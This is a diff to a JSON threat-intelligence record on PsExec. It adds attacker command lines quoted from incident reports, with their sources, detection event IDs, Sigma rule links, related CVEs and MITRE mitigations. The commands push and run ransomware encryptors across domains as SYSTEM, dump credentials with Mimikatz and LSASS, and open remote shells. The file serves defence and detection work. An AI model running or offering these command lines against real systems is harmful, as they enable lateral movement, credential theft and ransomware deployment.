+        "source_url": "https://www.fireeye.com/blog/threat-research/2020/10/kegtap-and-singlemalt-with-a-ransomware-chaser.html"
+      },
+      {
+        "command": "psexec.exe \\\\<IP ADDRESS> -u <DOMAIN>\\Administrator -p \"<PASSWORD>\" -s -d -h -r mstdc -accepteula -nobanner c:\\windows\\temp\\ttsel.exe",
+        "intent": "Ransomware deployment: run the Quantum payload on remote hosts as SYSTEM, with the PsExec service renamed to mstdc.",
+        "status": "verified",
+        "source_name": "DFIR Report Quantum Ransomware April 2022",
+        "source_url": "https://thedfirreport.com/2022/04/25/quantum-ransomware/"
+      },
+      {
+        "command": "PsExec.exe \\\\%1 -s -c m.bat -accepteula",
+        "intent": "Copy m.bat to each remote system and run it as SYSTEM to execute the modified Mimikatz variant that dumps credentials.",
+        "status": "verified",
+        "source_name": "Mandiant M-Trends 2018 April 2018",
+        "source_url": "https://static.carahsoft.com/concrete/files/1015/2779/3571/M-Trends-2018-Report.pdf"
+      },
+      {
+        "command": "cd c:\\&PsExec.exe -accepteula -d -h -high -u .\\<USERNAME> -p \"<PASSWORD>\" c:\\<RANSOMWARE_BINARY>.exe",
+        "intent": "Start the ransomware binary with alternate credentials in a script that launches the encryption process.",
+        "status": "verified",
+        "source_name": "Mandiant UNC2165 June 2022",
+        "source_url": "https://cloud.google.com/blog/topics/threat-intelligence/unc2165-shifts-to-evade-sanctions/"
+      },
+      {
+        "command": "cd c:\\&PsExec.exe -accepteula -d -h -i -high -u .\\<USERNAME> -p \"<PASSWORD>\" c:\\<RANSOMWARE_BINARY>.exe",
+        "intent": "Start the ransomware binary with alternate credentials in a script that launches the encryption process.",
+        "status": "verified",
+        "source_name": "Mandiant UNC2165 June 2022",
+        "source_url": "https://cloud.google.com/blog/topics/threat-intelligence/unc2165-shifts-to-evade-sanctions/"
+      },
+      {
+        "command": "cd c:\\&PsExec.exe -accepteula -d -h -u .\\<USERNAME> -p \"<PASSWORD>\" c:\\<RANSOMWARE_BINARY>.exe",
+        "intent": "Start the ransomware binary with alternate credentials in a script that launches the encryption process.",
+        "status": "verified",
+        "source_name": "Mandiant UNC2165 June 2022",
+        "source_url": "https://cloud.google.com/blog/topics/threat-intelligence/unc2165-shifts-to-evade-sanctions/"
+      },
+      {
+        "command": "cd c:\\&PsExec.exe -accepteula -d -h -i -u .\\<USERNAME> -p \"<PASSWORD>\" c:\\<RANSOMWARE_BINARY>.exe",
+        "intent": "Start the ransomware binary with alternate credentials in a script that launches the encryption process.",
+        "status": "verified",
+        "source_name": "Mandiant UNC2165 June 2022",
+        "source_url": "https://cloud.google.com/blog/topics/threat-intelligence/unc2165-shifts-to-evade-sanctions/"
+      },
+      {
+        "command": "psexec.exe \\\\<node> -u <user> -p \"!Secure4u123!\" -d -h -r winupd -s -accepteula -nobanner c:\\windows\\temp\\<redacted>.exe",
+        "intent": "Launch the file encryption executable on remote nodes as SYSTEM, with the PsExec service renamed to winupd.",
+        "status": "verified",
+        "source_name": "Huntress INC Ransom Group August 2023",
+        "source_url": "https://www.huntress.com/blog/investigating-new-inc-ransom-group-activity"
+      },
+      {
+        "command": "psexec.exe -accepteula -nobanner -s \\\\{hostname/ip} \"c:\\windows\\system32\\taskkill.exe\" /f /im WRSA.exe",
+        "intent": "Run an existing file (taskkill.exe) on a remote host with system-level privileges to terminate the WRSA.exe process.",
+        "status": "verified",
+        "source_name": "CISA Medusa Ransomware March 2025 (updated August 2026)",
+        "source_url": "https://www.cisa.gov/news-events/cybersecurity-advisories/aa25-071a"
+      },
+      {
+        "command": "psexec.exe -accepteula -nobanner -s \\\\{hostname/ip} -c coba.bat",
+        "intent": "Copy the batch script coba.bat to the remote host and run it with system-level privileges.",
+        "status": "verified",
+        "source_name": "CISA Medusa Ransomware March 2025 (updated August 2026)",
+        "source_url": "https://www.cisa.gov/news-events/cybersecurity-advisories/aa25-071a"
+      },
+      {
+        "command": "psexec.exe -accepteula -nobanner -s \\\\{hostname/ip} -c openrdp.bat",
+        "intent": "Copy openrdp.bat to the remote host and run it as SYSTEM; the advisory says it adds a firewall rule allowing inbound TCP 3389 and enables remote WMI connections.",
+        "status": "verified",
+        "source_name": "CISA Medusa Ransomware March 2025 (updated August 2026)",
+        "source_url": "https://www.cisa.gov/news-events/cybersecurity-advisories/aa25-071a"
+      },
+      {
+        "command": "psexec.exe -accepteula -nobanner -s \\\\{hostname/ip} -c StopAllProcess.bat",
+        "intent": "Copy the batch script StopAllProcess.bat to the remote host and run it with system-level privileges.",
+        "status": "verified",
+        "source_name": "CISA Medusa Ransomware March 2025 (updated August 2026)",
+        "source_url": "https://www.cisa.gov/news-events/cybersecurity-advisories/aa25-071a"
+      },
+      {
+        "command": "psexec.exe -accepteula -nobanner -s \\\\{hostname/ip} -c zam.bat",
+        "intent": "Copy the batch script zam.bat to the remote host and run it with system-level privileges.",
+        "status": "verified",
+        "source_name": "CISA Medusa Ransomware March 2025 (updated August 2026)",
+        "source_url": "https://www.cisa.gov/news-events/cybersecurity-advisories/aa25-071a"
+      },
+      {
+        "command": "psexec.exe -accepteula -nobanner -s \\\\{hostname/ip} c:\\temp\\x.bat",
+        "intent": "Run an existing local batch file (c:\\temp\\x.bat) on a remote host with system-level privileges.",
+        "status": "verified",
+        "source_name": "CISA Medusa Ransomware March 2025 (updated August 2026)",
+        "source_url": "https://www.cisa.gov/news-events/cybersecurity-advisories/aa25-071a"
+      },
+      {
+        "command": "psexec.exe -accepteula -nobanner -s \\\\{hostname/ip} cmd",
+        "intent": "Open a remote command shell on the target with system-level privileges.",
+        "status": "verified",
+        "source_name": "CISA Medusa Ransomware March 2025 (updated August 2026)",
+        "source_url": "https://www.cisa.gov/news-events/cybersecurity-advisories/aa25-071a"
+      },
+      {
+        "command": "psexec.exe -accepteula -nobanner -s \\\\{hostname/ip} cmd /c\"c:\\gaze.exe\"",
+        "intent": "Execute the Medusa encryptor gaze.exe on a remote host with system-level privileges via cmd /c.",
+        "status": "verified",
+        "source_name": "CISA Medusa Ransomware March 2025 (updated August 2026)",
+        "source_url": "https://www.cisa.gov/news-events/cybersecurity-advisories/aa25-071a"
+      },
+      {
+        "command": "$mytemp$\\low\\psexec64.exe -u <REDACTED> -p <REDACTED> cmd",
+        "intent": "Run a command prompt with the credentials of a privileged user to escalate privileges.",
+        "status": "verified",
+        "source_name": "Trend Micro Crypto24 August 2025",
+        "source_url": "https://www.trendmicro.com/en_us/research/25/h/crypto24-ransomware-stealth-attacks.html"
+      },
+      {
+        "command": "PsExec.exe /accepteula @comps1.txt -u \"domain.local\\Administrator\" -p \"REDACTED\" cmd /c COPY \"\\\\REDACTED\\share$\\ds.exe\" \"%WINDIR%\\temp\"",
+        "intent": "Copy the LockBit encryptor ds.exe from a share to every host listed in comps1.txt.",
+        "status": "verified",
+        "source_name": "DFIR Report LockBit January 2025",
+        "source_url": "https://thedfirreport.com/2025/01/27/cobalt-strike-and-a-pair-of-socks-lead-to-lockbit-ransomware/"
+      },
+      {
+        "command": "PsExec.exe /accepteula -d \\\\REDACTED -u \"domain.local\\Administrator\" -p \"REDACTED\" cmd /c COPY /Y \"\\\\REDACTED\\share$\\ds.exe\" \"%PUBLIC%\\Music\"",
+        "intent": "Copy the LockBit encryptor ds.exe to the Public Music folder on a remote host.",
+        "status": "verified",
+        "source_name": "DFIR Report LockBit January 2025",
+        "source_url": "https://thedfirreport.com/2025/01/27/cobalt-strike-and-a-pair-of-socks-lead-to-lockbit-ransomware/"
+      },
+      {
+        "command": "C:\\share$\\PsExec.exe -d @C:\\share$\\comps1.txt -u \"domain.local\\Administrator\" -p \"REDACTED\" cmd /c %WINDIR%\\temp\\ds.exe -pass REDACTED",
+        "intent": "Run the LockBit encryptor ds.exe on every host listed in comps1.txt.",
+        "status": "verified",
+        "source_name": "DFIR Report LockBit January 2025",
+        "source_url": "https://thedfirreport.com/2025/01/27/cobalt-strike-and-a-pair-of-socks-lead-to-lockbit-ransomware/"
+      },
+      {
+        "command": "cmd.exe /C PsExec64.exe -accepteula \\\\<DOMAIN-CONTROLLER-IP> -c -f -d -s up.bat",
+        "intent": "Run up.bat as SYSTEM on a domain controller; the script resets the password of a privileged service account.",
+        "status": "verified",
+        "source_name": "DFIR Report Nitrogen BlackCat September 2024",
+        "source_url": "https://thedfirreport.com/2024/09/30/nitrogen-campaign-drops-sliver-and-ends-with-blackcat-ransomware/"
+      },
+      {
+        "command": "cmd.exe /C PsExec64.exe -accepteula @pc.txt -c -f -d -h 1.bat",
+        "intent": "Run 1.bat on the hosts in pc.txt; the script sets safe mode with networking, enables auto-logon with a service account, adds the BlackCat binary to RunOnce and restarts the host.",
+        "status": "verified",
+        "source_name": "DFIR Report Nitrogen BlackCat September 2024",
+        "source_url": "https://thedfirreport.com/2024/09/30/nitrogen-campaign-drops-sliver-and-ends-with-blackcat-ransomware/"
+      },
+      {
+        "command": "psexec.exe \\\\[TARGET IP] -u [DOMAIN]\\[USER] -p \"[PASSWORD]\" -s -d -h -r mstdc -accepteula -nobanner c:\\windows\\temp\\p.bat",
+        "intent": "Remotely create a service named mstdc as SYSTEM to run p.bat, which runs the Nokoyawa ransomware k.exe.",
+        "status": "verified",
+        "source_name": "DFIR Report HTML Smuggling Nokoyawa August 2023",
+        "source_url": "https://thedfirreport.com/2023/08/28/html-smuggling-leads-to-domain-wide-ransomware/"
+      },
+      {
+        "command": "psexec.exe \\\\TARGET_HOST_IP -u DOMAIN\\USER -p \"PASSWORD\" -s -d -h -r mstdc -accepteula -nobanner c:\\windows\\temp\\p.bat",
+        "intent": "Deploy Nokoyawa ransomware at scale across the domain via p.bat with the PsExec service renamed to mstdc.",
+        "status": "verified",
+        "source_name": "DFIR Report IcedID Nokoyawa May 2023",
+        "source_url": "https://thedfirreport.com/2023/05/22/icedid-macro-ends-in-nokoyawa-ransomware/"
+      },
+      {
+        "command": "start PsExec.exe -accepteula @C:\\share$\\comps1.txt -u \"domain\\User\" -p \"$PASSWORD\" cmd /c COPY \"\\\\DOMAINCONTROLLER\\share$\\fQumH.exe\" \"C:\\windows\\temp\\\"",
+        "intent": "Copy the Conti payload fQumH.exe from a domain controller share to every host in comps1.txt.",
+        "status": "verified",
+        "source_name": "DFIR Report BazarCall Conti August 2021",
+        "source_url": "https://thedfirreport.com/2021/08/01/bazarcall-to-conti-ransomware-via-trickbot-and-cobalt-strike/"
+      },
+      {
+        "command": "start PsExec.exe -accepteula -d @C:\\share$\\comps5.txt -u \"domain\\User\" -p \"$PASSWORD\" cmd /c \"C:\\windows\\temp\\fQumH.exe\"",
+        "intent": "Run the staged Conti payload fQumH.exe on the hosts in comps5.txt.",
+        "status": "verified",
+        "source_name": "DFIR Report BazarCall Conti August 2021",
+        "source_url": "https://thedfirreport.com/2021/08/01/bazarcall-to-conti-ransomware-via-trickbot-and-cobalt-strike/"
+      },
+      {
+        "command": "psexec.exe -accepteula -d -s \\\\<INTERNAL_IP> rundll32.exe C:\\windows\\192145.dll,StartW",
+        "intent": "Run the copied Cobalt Strike beacon DLL on a remote host as SYSTEM with rundll32, distributing it through the environment.",
+        "status": "verified",
+        "source_name": "DFIR Report Conti Ransomware May 2021",
+        "source_url": "https://thedfirreport.com/2021/05/12/conti-ransomware/"
+      },
+      {
+        "command": "PsExec.exe -d \\\\HOST -u \"DOMAIN\\USER\" -p \"PASSWORD\" -accepteula -s cmd /c \"powershell.exe -ExecutionPolicy Bypass -file \\\\DOMAINCONTROLLER\\share$\\p.ps1\"",
+        "intent": "Run a PowerShell script from a share that calls comsvcs.dll to dump LSASS, automating credential collection.",
+        "status": "verified",
+        "source_name": "DFIR Report PYSA November 2020",
+        "source_url": "https://thedfirreport.com/2020/11/23/pysa-mespinoza-ransomware/"
+      },
+      {
+        "command": "C:\\psexec.exe @ip-list.txt -d cmd /c “(net use q: /delete /y &; net use q: \\\\DomainController\\DomainName /user:DomainName\\administrator ThisWasThePassword &; powershell -ExecutionPolicy ByPass -NoLogo -NoProfile -windowstyle hidden -NoExit -File q:\\P100119.ps1”",
+        "intent": "Mount a share on every host in ip-list.txt as the domain administrator and run the NetWalker PowerShell loader P100119.ps1.",
+        "status": "verified",
+        "source_name": "DFIR Report NetWalker August 2020",
+        "source_url": "https://thedfirreport.com/2020/08/31/netwalker-ransomware-in-1-hour/"
+      }
+    ]
+  },
+  "detections": {
+    "eventsid": [
+      {
+        "log": "WinEventLog:Security",
+        "event_id": 4624,
+        "data_components": "Logon Session Creation",
+        "techniques": "T1021.002"
+      },
+      {
+        "log": "WinEventLog:Security",
+        "event_id": 4648,
+        "data_components": "Logon Session Creation",
+        "techniques": "T1021.002"
+      },
+      {
+        "log": "WinEventLog:Security",
+        "event_id": 4697,
+        "data_components": "Service Creation",
+        "techniques": "T1543.003, T1569.002"
+      },
+      {
+        "log": "WinEventLog:Security",
+        "event_id": 4720,
+        "data_components": "User Account Creation",
+        "techniques": "T1136.002"
+      },
+      {
+        "log": "WinEventLog:Security",
+        "event_id": 5140,
+        "data_components": "Network Share Access",
+        "techniques": "T1570"
+      },
+      {
+        "log": "WinEventLog:Sysmon",
+        "event_id": 1,
+        "data_components": "Process Creation",
+        "techniques": "T1543.003, T1136.002, T1569.002, T1570, T1021.002"
+      },
+      {
+        "log": "WinEventLog:Sysmon",
+        "event_id": 3,
+        "data_components": "Network Connection Creation",
+        "techniques": "T1569.002, T1021.002"
+      },
+      {
+        "log": "WinEventLog:Sysmon",
+        "event_id": 6,
+        "data_components": "Driver Load",
+        "techniques": "T1543.003"
+      },
+      {
+        "log": "WinEventLog:Sysmon",
+        "event_id": 11,
+        "data_components": "File Creation",
+        "techniques": "T1570"
+      },
+      {
+        "log": "WinEventLog:Sysmon",
+        "event_id": 13,
+        "data_components": "Windows Registry Key Modification",
+        "techniques": "T1543.003, T1569.002"
+      },
+      {
+        "log": "WinEventLog:Sysmon",
+        "event_id": 14,
+        "data_components": "Windows Registry Key Modification",
+        "techniques": "T1543.003, T1569.002"
+      },
+      {
+        "log": "WinEventLog:Sysmon",
+        "event_id": 22,
+        "data_components": "Network Connection Creation",
+        "techniques": "T1569.002, T1021.002"
+      }
+    ],
+    "sigma_rules": [
+      {
+        "title": "Renamed PsExec Service Execution",
+        "level": "high",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_renamed_sysinternals_psexec_service.yml"
+      },
+      {
+        "title": "Psexec Execution",
+        "level": "medium",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_sysinternals_psexec_execution.yml"
+      },
+      {
+        "title": "PsExec/PAExec Escalation to LOCAL SYSTEM",
+        "level": "high",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_sysinternals_psexec_paexec_escalate_system.yml"
+      },
+      {
+        "title": "PsExec Service Execution",
+        "level": "medium",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_sysinternals_psexesvc.yml"
+      },
+      {
+        "title": "Potential Privilege Escalation To LOCAL SYSTEM",
+        "level": "high",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_sysinternals_susp_psexec_paexec_flags.yml"
+      }
+    ],
+    "related_sigma_rules": 5,
+    "other_rules": [
+      "https://raw.githubusercontent.com/splunk/security_content/develop/detections/endpoint/detect_psexec_with_accepteula_flag.yml",
+      "https://raw.githubusercontent.com/splunk/security_content/develop/detections/endpoint/detect_renamed_psexec.yml",
+      "https://raw.githubusercontent.com/elastic/detection-rules/main/rules/windows/execution_psexec_lateral_movement_command.toml"
+    ]
+  },
+  "related_CVE": [
     {
-      "eventsid": [
-        {
-          "sysmon": [
-            "T1136.002:process:process_creation:log_channel:Microsoft-Windows-Sysmon/Operational:log_provider:Microsoft-Windows-Sysmon:1",
-            "T1570:file:file_creation:log_channel:Microsoft-Windows-Sysmon/Operational:log_provider:Microsoft-Windows-Sysmon:11",
-            "T1021.002:network_traffic:Process_connected_to_Ip:log_channel:Microsoft-Windows-Sysmon/Operational:log_provider:Microsoft-Windows-Sysmon:3"
-          ],
-          "windows": [
-            "T1136.002:process:process_creation:log_channel:Security:log_provider:Microsoft-Windows-Security-Auditing:4688",
-            "T1136.002:script:script_execution:log_channel:Microsoft-Windows-PowerShell/Operational:log_provider:Microsoft-Windows-PowerShell:4103",
-            "T1136.002:user:A_computer_account_was_created:log_channel:Security:log_provider:Microsoft-Windows-Security-Auditing:4741",
-            "T1136.002:user:A_computer_account_was_created:log_channel:Security:log_provider:Microsoft-Windows-Security-Auditing:7020",
-            "T1570:user:An_attempt_was_made_to_access_an_object:log_channel:Security:log_provider:Microsoft-Windows-Security-Auditing:4663",
-            "T1021.002:user:User_created_logon_from_Ip:log_channel:Security:log_provider:Microsoft-Windows-Security-Auditing:4778",
-            "T1543.003:user:User_created_Service:log_channel:Security:log_provider:Microsoft-Windows-Security-Auditing:4697"
-          ]
-        }
-      ],
-      "sigma_rules": [
-        "https://raw.githubusercontent.com/SigmaHQ/sigma/master/rules/windows/file/file_event/file_event_win_sysinternals_psexec_service_key.yml",
-        "https://raw.githubusercontent.com/SigmaHQ/sigma/master/rules/windows/process_creation/proc_creation_win_sysinternals_psexec_remote_execution.yml",
-        "https://raw.githubusercontent.com/SigmaHQ/sigma/master/rules/windows/file/file_event/file_event_win_sysinternals_psexec_service_key.yml",
-        "https://raw.githubusercontent.com/SigmaHQ/sigma/master/rules/windows/builtin/security/win_security_metasploit_or_impacket_smb_psexec_service_install.yml"
-      ],
-      "other_rules": [
-        "https://raw.githubusercontent.com/splunk/security_content/develop/detections/endpoint/detect_psexec_with_accepteula_flag.yml",
-        "https://raw.githubusercontent.com/splunk/security_content/develop/detections/endpoint/detect_renamed_psexec.yml",
-        "https://raw.githubusercontent.com/elastic/detection-rules/main/rules/windows/execution_psexec_lateral_movement_command.toml"
-      ]
+      "id": "CVE-2021-1733",
+      "description": "Elevation of privilege vulnerability in Sysinternals PsExec itself: a local user could abuse it to escalate privileges.",
+      "references": "https://nvd.nist.gov/vuln/detail/CVE-2021-1733 https://www.tenable.com/plugins/nessus/146582"
+    },
+    {
+      "id": "CVE-2022-47966",
+      "description": "Zoho ManageEngine remote code execution (outdated Apache Santuario, when SAML SSO is configured). APT actors who exploited it in ServiceDesk Plus ran PsExec on that system to open Task Scheduler as SYSTEM and create a scheduled task; CISA notes lateral movement through PsExec was not confirmed.",
+      "references": "https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-250a"
     }
   ],
-  "related_CVE": [
-    "CVE-2022-47966",
-    "CVE-2022-42475",
-    "CVE-2021-1733"
-  ],
   "mitigations": [
-    "Ensure that permissions disallow services that run at a higher permissions level from being created or interacted with by a user with a lower permission level.",
-    "Ensure that high permission level service binaries cannot be replaced or modified by users with a lower permission level.",
-    "On Windows 10, enable Attack Surface Reduction (ASR) rules to block processes created by [PsExec](https://attack.mitre.org/software/S0029) from running. (Citation: win10_asr)",
-    "Limit privileges of user accounts and groups so that only authorized administrators can interact with service changes and service configurations. ",
-    "Ensure that Driver Signature Enforcement is enabled to restrict unsigned drivers from being installed. ",
-    "Use auditing tools capable of detecting privilege and service abuse opportunities on systems within an enterprise and correct them. ",
-    "Enforce registration and execution of only legitimately signed service drivers where possible.",
-    "Consider using the host firewall to restrict file sharing communications such as SMB. (Citation: Microsoft Preventing SMB)",
-    "Do not reuse local administrator account passwords across systems. Ensure password complexity and uniqueness such that the passwords cannot be cracked or guessed.",
-    "Deny remote use of local admin credentials to log into systems. Do not allow domain user accounts to be in the local Administrators group multiple systems.",
-    "Consider disabling Windows administrative shares.",
-    "Configure access controls and firewalls to limit access to domain controllers and systems used to create and manage accounts.",
-    "Protect domain controllers by ensuring proper security configuration for critical servers.",
-    "Do not allow domain administrator accounts to be used for day-to-day operations that may expose them to potential adversaries on unprivileged systems.",
-    "Use multi-factor authentication for user and privileged accounts."
+    {
+      "id": "M1028",
+      "name": "Operating System Configuration",
+      "technique": "T1543.003"
+    },
+    {
+      "id": "M1018",
+      "name": "User Account Management",
+      "technique": "T1543.003"
+    },
+    {
+      "id": "M1047",
+      "name": "Audit",
+      "technique": "T1543.003"
+    },
+    {
+      "id": "M1040",
+      "name": "Behavior Prevention on Endpoint",
+      "technique": "T1543.003"
+    },
+    {
+      "id": "M1045",
+      "name": "Code Signing",
+      "technique": "T1543.003"
+    },
+    {
+      "id": "M1030",
+      "name": "Network Segmentation",
+      "technique": "T1136.002"
+    },
+    {
+      "id": "M1028",
+      "name": "Operating System Configuration",
+      "technique": "T1136.002"
+    },
+    {
+      "id": "M1032",
+      "name": "Multi-factor Authentication",
+      "technique": "T1136.002"
+    },
+    {
+      "id": "M1026",
+      "name": "Privileged Account Management",
+      "technique": "T1136.002"
+    },
+    {
+      "id": "M1040",
+      "name": "Behavior Prevention on Endpoint",
+      "technique": "T1569.002"
+    },
+    {
+      "id": "M1022",
+      "name": "Restrict File and Directory Permissions",
+      "technique": "T1569.002"
+    },
+    {
+      "id": "M1026",
+      "name": "Privileged Account Management",
+      "technique": "T1569.002"
+    },
+    {
+      "id": "M1031",
+      "name": "Network Intrusion Prevention",
+      "technique": "T1570"
+    },
+    {
+      "id": "M1037",
+      "name": "Filter Network Traffic",
+      "technique": "T1570"
+    },
+    {
+      "id": "M1037",
+      "name": "Filter Network Traffic",
+      "technique": "T1021.002"
+    },
+    {
+      "id": "M1027",
+      "name": "Password Policies",
+      "technique": "T1021.002"
+    },
+    {
+      "id": "M1035",
+      "name": "Limit Access to Resource Over Network",
+      "technique": "T1021.002"
+    },
+    {
+      "id": "M1026",
+      "name": "Privileged Account Management",
+      "technique": "T1021.002"
+    }
   ],
+  "additional_mitigations": [],
   "references": [
     "https://attack.mitre.org/software/S0029/",
     "https://app.tidalcyber.com/software/73eb32af-4bd3-4e21-8048-355edc55a9c6-PsExec",
     "https://strontic.github.io/xcyclopedia/library/PsExec.exe-27304B246C7D5B4E149124D5F93C5B01.html"
-  ]
+  ],
+  "sources": {
+    "attack": "MITRE ATT&CK Enterprise v20.0",
+    "sigma": "SigmaHQ commit 7d8b152a5fc062ebd309f62ae4d8276aca2786af (rules under DRL 1.1)"
+  }
 }
